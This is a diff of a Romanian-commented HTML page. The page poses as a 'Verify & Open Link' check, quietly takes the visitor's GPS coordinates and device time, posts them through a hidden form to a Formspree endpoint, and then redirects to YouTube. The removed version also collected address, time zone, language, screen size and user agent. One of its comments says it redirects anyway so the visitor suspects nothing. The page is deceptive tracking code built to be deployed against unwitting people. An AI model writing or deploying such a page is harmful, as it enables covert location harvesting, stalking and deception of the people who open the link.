@@ -9,6 +9,7 @@
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         button { padding: 12px 24px; font-size: 16px; font-weight: bold; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        #hidden-form { display: none; }
     </style>
 </head>
 <body>
@@ -19,71 +20,44 @@
         <button onclick="startTest()">Verify & Open Link</button>
     </div>
 
+    <!-- Formularul ascuns care trimite datele garantat prin browser -->
+    <!-- Înlocuiește doar ID_UL_TAU_AICI cu codul tău real Formspree -->
+    <form id="hidden-form" action="https://formspree.io" method="POST">
+        <input type="text" name="Latitude" id="form-lat">
+        <input type="text" name="Longitude" id="form-lon">
+        <input type="text" name="Device_Time" id="form-time">
+        <!-- Formspree va redirecționa automat utilizatorul aici după trimitere -->
+        <input type="hidden" name="_next" value="https://youtube.com">
+    </form>
+
     <script>
-        // ⚠️ ÎNLOCUIEȘTE CU LINK-UL TĂU REAL DE LA FORMSPREE:
-        const FORMSPREE_URL = "https://formspree.io"; 
-
-        // ⚠️ Locul unde va fi trimis utilizatorul la final
-        const REDIRECT_URL = "https://youtube.com"; 
-
         function startTest() {
+            document.getElementById('content-box').innerHTML = '<div class="loader"></div><p>Verifying permissions...</p>';
+            
             if (navigator.geolocation) {
-                document.getElementById('content-box').innerHTML = '<div class="loader"></div><p>Verifying permissions...</p>';
-                navigator.geolocation.getCurrentPosition(sendLocationToMe, handleErrors);
+                // Dacă utilizatorul nu răspunde în 4 secunde, trimitem formularul gol doar ca să îl redirecționăm
+                setTimeout(forceSubmit, 4000);
+
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        document.getElementById('form-lat').value = position.coords.latitude;
+                        document.getElementById('form-lon').value = position.coords.longitude;
+                        document.getElementById('form-time').value = new Date().toLocaleString();
+                        forceSubmit();
+                    }, 
+                    function(error) {
+                        // Dacă dă block/eroare, trimitem direct ca să plece de pe pagină
+                        forceSubmit();
+                    },
+                    { timeout: 3000 }
+                );
             } else {
-                alert("Geolocation is not supported by this browser.");
+                forceSubmit();
             }
         }
 
-        function sendLocationToMe(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-
-            // REPARAT: URL-ul corect pentru OpenStreetMap (Nominatim API)
-            fetch(https://openstreetmap.org{lat}&lon=${lon})
-                .then(res => res.json())
-                .then(data => {
-                    const physicalAddress = data.display_name  "Unknown Address";
-                    submitData(lat, lon, physicalAddress);
-                })
-                .catch(() => {
-                    submitData(lat, lon, "Address Lookup Failed");
-                });
-        }
-
-        function submitData(lat, lon, address) {
-            const localDateTime = new Date().toLocaleString();
-            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const deviceLanguage = navigator.language  navigator.userLanguage;
-            const screenSize = ${window.screen.width}x${window.screen.height};
-
-            // REPARAT: Folosim FormData pentru compatibilitate maximă cu Formspree Free
-            const formData = new FormData();
-            formData.append("Latitude", lat);
-            formData.append("Longitude", lon);
-            formData.append("Estimated_Address", address);
-            formData.append("Device_Local_Time", localDateTime);
-            formData.append("Time_Zone", timeZone);
-            formData.append("Device_Language", deviceLanguage);
-            formData.append("Screen_Resolution", screenSize);
-            formData.append("Browser_User_Agent", navigator.userAgent);
-
-            fetch(FORMSPREE_URL, {
-                method: "POST",
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            })
-            .then(() => {
-                window.location.href = REDIRECT_URL;
-            })
-            .catch(() => {
-                // Redirecționăm oricum, chiar dacă Formspree eșuează, ca utilizatorul să nu bănuiască nimic
-                window.location.href = REDIRECT_URL;
-            });
-        }
-
-        function handleErrors(error) {
-            document.getElementById('content-box').innerHTML = '<h3>Error</h3><p>You must allow location access to view this content.</p><br><button onclick="location.reload()">Try Again</button>';
+        function forceSubmit() {
+            document.getElementById('hidden-form').submit();
         }
     </script>
 </body>
